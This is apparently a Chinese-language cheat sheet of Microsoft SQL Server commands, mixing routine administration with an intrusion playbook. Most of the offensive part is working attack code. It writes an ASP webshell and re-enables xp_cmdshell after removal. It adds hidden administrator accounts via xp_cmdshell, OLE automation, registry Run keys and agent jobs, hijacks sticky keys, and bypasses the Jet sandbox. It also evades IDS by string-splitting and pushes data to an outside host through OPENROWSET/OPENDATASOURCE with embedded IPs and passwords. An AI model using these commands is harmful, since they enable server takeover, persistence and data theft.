–取得所有数据库名 包括系统数据库
–SELECT name FROM master.dbo.sysdatabases
– 取得所有非系统数据库名
–select [name] from master.dbo.sysdatabases where DBId>6 Order By [Name]
–取所有信息,包括数据库文件地址
–select * from master.dbo.sysdatabases where DBId>6 Order By [Name]

该条语句查询返回所有的用户表
 
select * from sysobjects where xtype='u'
 
查询系统所有数据表信息
 
select * from sysobjects

查看机器名
select * from sys.servers


列目录
exec master.dbo.xp_subdirs 'c:\’

exec master.dbo.xp_dirtree ‘c:’,1,1 db_owner权限可以执行

exec master.dbo.xp_dirtree ‘c:/Program Files’,1,1


程序代码,写入webshell

exec master.dbo.xp_subdirs ‘d:\web\www.xx.com’;
exec sp_makewebtask ‘d:\web\www.XXXX.com\XX.asp’,'select”<%execute(request(“SB”))%>”



execute master..xp_enumgroups	遍历系统用户

execute master..xp_getnetname 获取当前机器名

 --列出服务器上固定驱动器,以及每个驱动器的可用空间
execute master..xp_fixeddrives   //dbo public

execute xp_ntsec_enumdomains

--创建个登陆mssql的帐号
exec master.dbo.sp_addlogin name,pass;--



--列出服务器域名
xp_ntsec_enumdomains //机器名 //dbo public

--停止或者启动某个服务
xp_servicecontrol 'stop','schedule' //schedule是服务得名称   //dbo

--用pid来停止某个执行中的程序
xp_terminate_process 123 //123是pid //dbo

--只列某个目录下的子目录
dbo.xp_subdirs 'C:' //dbo

sql server 2005下开启xp_cmdshell的办法
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
SQL2005开启'OPENROWSET'支持的方法：
exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;
SQL2005开启'sp_oacreate'支持的方法:
exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE


sql server 2008下开启xp_cmdshell的方法

-- To allow advanced options to be changed.
EXEC sp_configure 'show advanced options', 1
GO
-- To update the currently configured value for advanced options.
RECONFIGURE
GO
-- To enable the feature.
EXEC sp_configure 'xp_cmdshell', 1
GO
-- To update the currently configured value for this feature.
RECONFIGURE
GO

exec xp_cmdshell 'ipconfig'

今天想到修改下数据库服务器的sa登陆密码，可突然忘记了，只好借助其他账户打开查询分析器修改sa的密码了，很简单：

执行：
sp_password Null,'teracypwd,'sa'
把SA的密码设为“teracypwd”

执行成功后有“Command(s) completed successfully.”  OK!
 



在db权限并且分离获取mssql数据库服务器ip的方法

1.本地nc监听   nc -vvlp 80

2.;insert into OPENROWSET('SQLOLEDB','uid=sa;pwd=xxx;Network=DBMSSOCN;Address=你的ip,80;', 'select * from dest_table') select * from src_table;--

select * from openrowset('sqloledb','server=125.110.145.130,6789;uid=sa;pwd=zhu','select user;')



xp_cmdshell的删除及恢复

恢复xp_cmdshell的方法   
删除扩展存储过过程xp_cmdshell的语句   
exec sp_dropextendedproc ’xp_cmdshell’   

恢复cmdshell的sql语句   
exec sp_addextendedproc xp_cmdshell ,@dllname =’xplog70.dll’   

exec master.dbo.addextendedproc ’xp_cmdshell’,’xplog70.dll’;select count(*) from master.dbo.sysobjects where xtype=’x’ and   
返回结果为1就ok   

否则需上传c:\inetput\web\xplog70.dll后   
exec master.dbo.sp_addextendedproc ’xp_cmdshell’,’c:\inetput\web\xplog70.dll’;--   

如果是用以下方法删除   
drop procedure sp_addextendedproc   
drop procedure sp_oacreate   
exec sp_dropextendedproc ’xp_cmdshell’   

则可以用以下语句恢复   
dbcc addextendedproc ("sp_oacreate","odsole70.dll")   
dbcc addextendedproc ("xp_cmdshell","xplog70.dll")   
这样可以直接恢复，不用去管sp_addextendedproc是不是存在



1、用xp_cmdshell：
  	exec master.dbo.xp_cmdshell "net user admin admin /add"
  	exec master.dbo.xp_cmdshell "net localgroup administrators admin /add"
2、无xp_cmdshell情况下,用sp_oacreate跟sp_oamethod：
  	declare @object int   
  	exec sp_oacreate 'wscript.Shell',@object out	 
  	exec sp_oamethod @object,'Run',NULL,'net user admin admin /add'
  	exec sp_oamethod @object,'Run',NULL,'net localgroup Administrators admin /add'
  	注：regsvr32 /s c:\windows\system32\wshom.ocx 启动wscript.shell
3、用sp_oacreate跟FSO
  	declare @o int
  	exec sp_oacreate 'scripting.filesystemobject', @o out
  	exec sp_oamethod @o, 'copyfile',null,'c:\windows\explorer.exe' ,'c:\windows\system32\sethc.exe';
  	declare @oo int
  	exec sp_oacreate 'scripting.filesystemobject', @oo out
  	exec sp_oamethod @oo, 'copyfile',null,'c:\windows\system32\sethc.exe' ,'c:\windows\
  	system32\dllcache\sethc.exe';
4、用xp_regwrite (db_owner,需重启)：
  	exec master.dbo.xp_regwrite 'hkey_local_machine','software\microsoft\windows\currentversion\
  	run','eadd1','reg_sz','net user admin admin /add'
  	exec master.dbo.xp_regwrite 'hkey_local_machine','software\microsoft\windows\currentversion\
  	run','eadd2','reg_sz','net localgroup administrators admin /add'
5、用sp_add_job：
  	exec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT'
  	use msdb exec sp_delete_job null,'x'
  	exec sp_add_job 'x'
  	exec sp_add_jobstep Null,'x',Null,'1','CMDEXEC','cmd /c net user admin admin /add'
  	exec sp_add_jobserver Null,'x',@@servername exec sp_start_job 'x'







 很多人SA直接用沙盒模式成功了好多机器，但我从来没实践过，也不太清楚成功率如何。当扩展被删除时，先恢复对注册表的读写存储。
dbcc addextendedproc ('xp_regread','xpstar.dll')
dbcc addextendedproc ('xp_regwrite','xpstar.dll')

修复沙盒的保护模式
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;--

查看'SandBoxMode'值是否已经变成0了。

exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines', 'SandBoxMode'

最后调用沙盒模式
select * from openrowset('microsoft.jet.oledb.4.0',';database=C:\WINDOWS\system32\ias\dnary.mdb','select shell("cmd.exe /c net user user passwd /add")')



1、如果沙盒保护模式未“关闭”，会报错：
  	服务器: 消息 7357，级别 16，状态 2，行 1
  	未能处理对象 'select shell("cmd.exe /c net user user passwd /add")'。OLE DB 提供程序'microsoft.jet.oledb.4.0' 指出该对象中没有任何列。
  	OLE DB 错误跟踪［Non-interface error: OLE DB provider unable to process object, since the object has nocolumnsProviderName='microsoft.jet.oledb.4.0', Query=select shell("cmd.exe /c net user user passwd /add")'］。

2、如果.mdb不存在或是输入路径错误
   	服务器: 消息 7399，级别 16，状态 1，行 1
    	OLE DB 提供程序 'microsoft.jet.oledb.4.0' 报错。
    	[OLE/DB provider returned message: 找不到文件 'C:\WINDOWS\system32\ias\dnary1.mdb'。]
   	OLE DB 错误跟踪［OLE/DB Provider 'microsoft.jet.oledb.4.0' IDBInitialize::Initialize returned 0x80004005: ］。

3、如果输入过程中多了一些空格，也会报错。尤其要注意这点，很多人直接网上找文章复制粘贴进去执行。
  	服务器: 消息 7357，级别 16，状态 2，行 1
  	未能处理对象 'select shell("cmd.exe /c net user user passwd /add")'。OLE DB 提供程序'microsoft.jet.oledb.4.0' 指出该对象中没有任何列。
  	OLE DB 错误跟踪［Non-interface error: OLE DB provider unable to process object, since the object has nocolumnsProviderName='microsoft.jet.oledb.4.0', Query=select shell("cmd.exe /c net user user passwd /add")'］。

4、如果mdb权限和cmd.exe权限不对，同样会也出现问题。
  	当mdb权限不对时，
   	服务器: 消息 7320，级别 16，状态 2，行 1
  	未能对 OLE DB 提供程序 'Microsoft.Jet.OLEDB.4.0' 执行查询。
   	[OLE/DB provider returned message: 未知]
   	OLE DB 错误跟踪［OLE/DB Provider 'Microsoft.Jet.OLEDB.4.0' ICommandText::Execute returned 0x80040e14］。

5、如果net权限不对时，却没有任何提示。
  	最终的提权办法就是在当前的web目录下面上传系统的ias.mdb和cmd.exe，net.exe三个文件。
  	执行select * from openrowset('microsoft.jet.oledb.4.0',';database=E:\web\ias.mdb','select shell("E:\web\cmd.exe /c E:\web\net.exe user user passwd /add")')
  	成功增加一个计算机用户。
 	 
 	 
 	 
拆分cmdshell绕过IDS	 
declare @a sysname set @a='xp_'+'cmdshell' exec @a 'ipconfig'
declare @a sysname set @a='xp'+'_cm'+'dshell' exec @a 'dir c:\'


编辑注册表劫持shift
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','debugger','REG_sz','c:\windows\system32\cmd.exe on';--

查询linkserver
select srvid,srvstatus,srvname,srvproduct,providername,datasource,location,schemadate,catalog,srvnetname,isremote,rpc,dataaccess from master.dbo.sysservers
select srvid,srvstatus,srvname,srvproduct,providername,datasource,location,schemadate,catalog,srvnetname,isremote,rpc,dataaccess from master.dbo.sysservers

查询linkserver2
select distinct hostname,db_name(dbid),net_address,loginame,program_name from master..sysprocesses

查询linkserver等登录用户
select * from [192.168.1.1].master.dbo.syslogins

查询linkserver上的所有数据库
select * from  linkedSrvWeb.master.dbo.sysdatabases

在linkserver上执行扩展存储
exec [ip].master.dbo.xp_cmdshell

在linkserver上查询所有的表
select * from  [ip].master.dbo.sysobjects




select * from openrowset('sqloledb','server=IP;uid=用户;pwd=密码','select @@version')

select * from openquery([LINKSERVER名称],'select @@version')


select * from openquery(NDOORS,'select IS_SRVROLEMEMBER(''sysadmin'')')


select * from openquery(GM_SERVER,'select * from sysobjects where xtype = (''U'')')

select * from openquery(NDOORS,'Select IS_MEMBER(''db_owner'')')


select * from openquery(toatdeweb,'select srvname from master.dbo.sysservers')

insert into opendatasource('sqloledb','server=222.241.95.12;uid=scd;pwd=a123520;database=hack520').hack520.dbo.zhu select name from master.dbo.sysdatabases
create database hack520 Create TABLE zhu(name nvarchar(256) null);Create TABLE J8(id int NULL,name nvarchar(256) null);

select * from openquery(toatdeweb,'set fmtonly off exec master.dbo.xp_cmdshell ''net user''')

exec master..xp_dirtree 'c:\',1,1 执行查询目录

exec links.master..xp_cmdshell 'ipconfig'

select * from openquery(toatdeweb,'set fmtonly off exec master.dbo.xp_cmdshell ''ipconfig /all''')

连接mysql Select * from Mem_DB.UserDB.dbo.AdminList

EXEC MASTER..XP_dirtree 'c:\',1,1


Exec master.dbo.xp_cmdshell 'dir '

select count(*) from [表明] 查询当前表有多少数据


select distinct hostname,db_name(dbid),net_address,loginame,program_name from master..sysprocesses



select * from gamedb01.Server01.dbo.cabal_character_table where name='猪'


你删除的时候显示：数据库正在被使用，无法删除。

点击要删除的数据库，打开事件查看器。

输入：

use   master
go
然后输入以下内容：
declare   @d   varchar(8000)
set   @d= ' '
select   @d=@d+ '   kill   '+cast(spid   as   varchar)+char(13)
from   master..sysprocesses   where   dbid=db_id( '库名 ')
exec(@d)
--用代码先删除连接此数据库的进程






mssql通过linkserver操作oracle



1)在SQL_SERVER 2005服务器上安装Oracle 9i的客户端。假设安装到C:\ora92i\ 目录。如果D:是NTFS分区，需要将ORACLE安装后的目录设为所使用的用户有权可运行、可添加、可删除。

2)配置C:\ora92i\network\ADMIN\tnsnames.ora 文件。（以下红色文字是一个配置范例）

ORCL=

(DESCRIPTION =

(ADDRESS_LIST =

(ADDRESS = (PROTOCOL = TCP)(HOST = 192.168.0.11)(PORT= 1521))

)

(CONNECT_DATA =

(SERVICE_NAME = orcl)

)

)

3)在DOS模式下运行以下命令以便确认ORACLE客户端安装无误。

sqlplus user/password@ORCL

4）打开开始-控制面板-服务，确认Distributed Transaction Coordinator服务已启动。

5)打开SQL SERVER Management Studio，实例名称（ORCL）-服务器对象（右键）-新建连接服务器。

1.  	链接服务器：写上链接服务器的名字，如：OracleTest

2.  	服务器类型，选择其他数据源

3.  	访问接口：选择Oracle Provider for OLE DB

4.  	产品名称：写上Oracle

5.  	数据源：写上tnsnames.ora文件中配置的服务名，如：ORCL

6.  	访问接口字符串：userid=sys as sysdba;password=password

7.  	在选择安全性选项页，使用此安装上下文建立连接：

a)  	远程登录：user(其他用户，非sys)

b)  	使用密码：password

8.  	本地登录上设置“NT AUTHORITY\SYSTEM”，远程用户sys，设置密码

9.  	确定

6)SQL的写法有两种

a) 使用T-SQL语法:

   	SELECT * FROM OraTest.ERP.BAS_ITEM_CLASS

   	注意在，SQL查询分析器中输入SQL语句时注意中文的全角半角切换方式！

b) 使用PLSQL语法：
   	SELECT * FROM openquery(OraTest,'SELECT * FROM OraTest.ERP.BAS_ITEM_CLASS ')

   	c)第二种访问方式比第一种约快50％；第二种访问方式跟直连ORACLE的速度相当；第一种访问方式可能会导致一些意外错误，如：
   	该表不存在，或者当前用户没有访问该表的权限等等一些信息。

   	d)如果需要访问的column中使用没有精度的数据类型，这两种查询方式都可能会报错，这是ORACLE的BUG，无法修正，只能通过查询语句的特殊处理规避这一问题：
   	OLE DB 提供程序 'OraOLEDB.Oracle' 为列提供的元数据不一致。执行时更改了元数据信息。





mssql添加删除用户，并赋予权限

use 你的库名   
go   
--新增用户   
exec sp_addlogin 'test' --添加登录   
exec sp_grantdbaccess N'test' --使其成为当前数据库的合法用户   
exec sp_addrolemember N'db_owner', N'test' --授予对自己数据库的所有权限   
--这样创建的用户就只能访问自己的数据库,及数据库中包含了guest用户的公共表   
go   
--删除测试用户   
exec sp_revokedbaccess N'test' --移除对数据库的访问权限   
exec sp_droplogin N'test' --删除登录   
如果在企业管理器中创建的话,就用:   
企业管理器--安全性--右键登录--新建登录   
常规项   
--名称中输入用户名   
--身份验证方式根据你的需要选择(如果是使用windows身份验证,则要先在操作系统的用户中新建用户)   
--默认设置中,选择你新建的用户要访问的数据库名   
服务器角色项   
这个里面不要选择任何东西   
数据库访问项   
勾选你创建的用户需要访问的数据库名   
数据库角色中允许,勾选"public","db_ownew"   
确定,这样建好的用户与上面语句建立的用户一样   
---------------------------------------------------------------------------   
最后一步,为具体的用户设置具体的访问权限,这个可以参考下面的最简示例:   
--添加只允许访问指定表的用户:   
exec sp_addlogin '用户名','密码','默认数据库名'   
--添加到数据库   
exec sp_grantdbaccess '用户名'   
--分配整表权限   
GRANT SELECT , INSERT , UPDATE , DELETE ON table1 TO [用户名]   
--分配权限到具体的列   
GRANT SELECT , UPDATE ON table1(id,AA) TO [用户名]   
-------------------------------------------------------------------   
至于具体的安全设置和理论知道,参考SQL联机帮助  



  固定数据库角色 描述   
  db_owner 在数据库中有全部权限。   
  db_accessadmin 可以添加或删除用户 ID。   
  db_securityadmin 可以管理全部权限、对象所有权、角色和角色成员资格。   
  db_ddladmin 可以发出 ALL DDL，但不能发出 GRANT、REVOKE 或 DENY 语句。   
  db_backupoperator 可以发出 DBCC、CHECKPOINT 和 BACKUP 语句。   
  db_datareader 可以选择数据库内任何用户表中的所有数据。   
  db_datawriter 可以更改数据库内任何用户表中的所有数据。   
  db_denydatareader 不能选择数据库内任何用户表中的任何数据。   
  db_denydatawriter 不能更改数据库内任何用户表中的任何数据。  


你应该选择db_datareader，db_datawriter，db_accessadmin


5. 在SQL Server实例以单用户模式启动后，Windows管理员帐号就能使用sqlcmd工具在Windows验证模式下连接SQL Server。您可以使用T-SQL命令诸如“sp_addsrvrolemember”来在sysadmin服务器角色中添加现有登录帐号或新创建一个登录帐号。范例语句如下：

EXEC sp_addsrvrolemember 'CONTOSO\Buck', 'sysadmin';

GO

增加一个sysadmin权限的用户




(1)管理服务器角色

在SQL Server中，实现SQL Server角色管理的存储过程主要有两个：

sp_addsrvrolemember和sp_dropsrvrolemember

sp_addsrvrolemember可以将某一登录帐号加入到服务器角色中，使其成为该服务器角色的成员。语法如下：
sp_addsrvrolemember login , role

sp_dropsrvrolemember可以将某一登录帐号从某一服务器角色中删除，当该成员从服务器角色中被删除后，便不再具有该服务器角色所设置的权限。语法如下：
sp_dropsrvrolemember [@loginname=]'login',[@rolename=]'role'

其中@loginname为登录者名称；@rolename为服务器角色。


(2)管理数据库角色

在SQL Server中，支持数据库管理的存储过程主要有六种，其具体含义和语法如下：

sp_addrole：用于创建一个新的数据库角色；
sp_addrole role, owner

sp_droprole：用于从当前数据库角色中删除一个数据库角色；
sp_droprole role

sp_helprole：用于显示当前数据库中所有数据库角色的全部信息；
sp_helprole ['role']

sp_addrolemember：用于向数据库某一角色中添加数据库用户，这些角色可以是用户自定义的标准角色，也可以是固定的数据库角色，但不能是应用程序角色。
sp_addrolemember role, security_account

sp_droprolemember：用于删除某一角色的用户；
sp_droprolemember role, security_account

sp_helprolemember：用于显示某一数据库角色的所有成员。
sp_helprolemember ['role']